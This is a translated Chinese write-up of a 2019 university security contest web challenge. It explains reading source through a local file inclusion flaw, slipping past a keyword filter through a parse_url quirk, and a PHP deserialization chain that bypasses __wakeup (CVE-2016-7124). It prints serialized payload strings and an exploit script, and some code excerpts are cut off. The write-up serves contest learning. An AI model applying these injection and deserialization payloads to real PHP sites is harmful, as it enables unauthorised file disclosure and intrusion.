# 2019全国大学生信息安全竞赛Web Writeup
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
这次web题真切得让我感受到了我得辣鸡 顿时被打了鸡血 最后只做出来一题，但是有两道题都是马上要出来了最后时间不够 ，这里总结一下
## web1 JustSoso
打开之后是这样得
右键查看源码
提示需要传参数，这里存在LFI漏洞，常规操作伪协议读一下源码：
index.php:
    ';
    }
    if(preg_match("/flag/",$file)){
        die('hack attacked!!!');
    }
    @include($file);
    if(isset($payload)){  
        $url = parse_url($_SERVER['REQUEST_URI']);
        parse_str($url['query'],$query);
        foreach($query as $value){
            if (preg_match("/flag/",$value)) { 
                die('stop hacking!');
                exit();
            }
        }
        $payload = unserialize($payload);
    }else{ 
       echo "Missing parameters"; 
    } 
    ?>
hint.php:
     $v) {
                    $this->$k = null;         
                }          
                echo "Waking upn";      
        }
        public function __construct($handle) {           
            $this->handle = $handle;       
        }    
        public function __destruct(){    
            $this->handle->getFlag();   
        }  
    }    
    class Flag{      
        public $file;      
        public $token;      
        public $token_flag;         
        function __construct($file){    
            $this->file = $file;    
            $this->token_flag = $this->token = md5(rand(1,10000));      
        }         
        public function getFlag(){    
            $this->token_flag = md5(rand(1,10000));          
            if($this->token === $this->token_flag){     
                if(isset($this->file)){      
                    echo @highlight_file($this->file,true);               
                }            
            }      
        }  
    }
    ?>
首先会对我们传入的参数调用parse_url函数进行解析，然后对我们得每个参数进行正则匹配，匹配到flag就直接退出。这里就要用到parse_url得解析漏洞，可以查看一叶飘零师傅得文章：
我们只需要
就可以绕过正则匹配。
之后我们查看hint.php,看到
class Handle{}中引用了getFlag函数
    public function __destruct(){    
            $this->handle->getFlag();   
     }
class Flag{}中定义了getFlag函数：
        public function getFlag(){    
            $this->token_flag = md5(rand(1,10000));          
            if($this->token === $this->token_flag){     
                if(isset($this->file)){      
                    echo @highlight_file($this->file,true);               
                }            
            }      
        }
所以最终我们的目的就是触发getFlag函数，且传入file参数为flag.php
显然这里考察的是反序列化，因此我们构造pop链。
1，构造一个Flag类型得变量，传入参数为flag.php => $b = new Flag(“flag.php”);
2, 构造一个Handle类型得变量，使内部$handle指向$b,这样__destruct时就行触发执行getFlag函数。=>
$a = new Handle($b);
要注意到这里class Handle{}中有__wakeup()函数：
        public function __wakeup(){
                foreach(get_object_vars($this) as $k => $v) {
                    $this->$k = null;         
                }          
                echo "Waking upn";      
        }
unserialize()时会先检查是否存在一个 _-wakeup方法。如果存在，会先调用__wakeup方法，预先准备对象需要的资源。这里_
_wakeup函数会将我们传入的参数全部置空，因此需要绕过让其不执行wakeup方法。
这里使用得是wakeup( **CVE-2016-7124** ),当成员属性数目大于实际数目时，可以绕过wakeup方法。
这里可以参考Mrsm1th师傅得文章：
我们只需要在反序列化之后，修改一下变量数量就行(O:6:”Handle”:后面得这个1改为2即可)：
    O:6:"Handle":1:{s:12:"Handlehandle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";N;s:10:"token_flag";R:4;}}
前面 都准备好了，但是在最后还有一个判断：
Flag类：
    function __construct($file){    
            $this->file = $file;    
            $this->token_flag = $this->token = md5(rand(1,10000));      
        }         
        public function getFlag(){    
            $this->token_flag = md5(rand(1,10000));          
            if($this->token === $this->token_flag){     
                if(isset($this->file)){      
                    echo @highlight_file($this->file,true);               
                }            
            }      
        }
在flag类中首先会随机生成两个md5，一个时token，一个是token_flag。在我们最开始构造序列化字符串时就已经生成好了，类似这样：
    O:6:"Handle":1:{s:14:"Handlehandle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";s:32:"b2330fc4531de135266de49078c270dd";s:10:"token_flag";s:32:"b2330fc4531de135266de49078c270dd";}}
但是服务器在反序列化之后执行getFlag函数时会再随机生成一个token_flag,而且二者要相等才能拿到flag。这里由于生成位置不在一个机器，伪随机走不通，我一开始想的时爆破，毕竟数量也不多。而且传入的token是不变的，变得是服务器重新生成得token_flag，因此我的思路是不停得循环传入我们构造好的反序列化字串，总有一个刚好服务器生成得token_flag和我们传得token相等，我们就拿到了。然并卵。国赛得服务器太稳了，有一个安全机制，他检测到我有攻击行为，跑一会就给我封掉了。
后来找到一个正解，使用php得引用赋值来绕过。
原理：
    a=1;
    b=&a;
    a=a+1;
那末最后b得值也会变为2，因为b是引用赋值。
这里我们同样得方法，我们在构造序列化字符串得时候加上这么一句：
    $b = new Flag("flag.php");
    $b->token=&$b->token_flag;
    $a = new Handle($b);
那末token得值就始终和token_flag保持一致了。
最终我们得脚本：
exploit.php:
     $v) {
                    $this->$k = null;         
                }          
                echo "Waking upn";      
        }
        public function __construct($handle) {           
            $this->handle = $handle;       
        }    
        public function __destruct(){    
            $this->handle->getFlag();   
        }  
    }    
    class Flag{      
        public $file;      
        public $token;      
        public $token_flag;         
        function __construct($file){    
            $this->file = $file;    
            $this->token_flag = $this->token = md5(rand(1,10000));      
        }         
        public function getFlag(){       
            if(isset($this->file)){      
                echo @highlight_file($this->file,true);               
            }            
        }  
    }
    $b = new Flag("flag.php");
    $b->token=&$b->token_flag;
    $a = new Handle($b);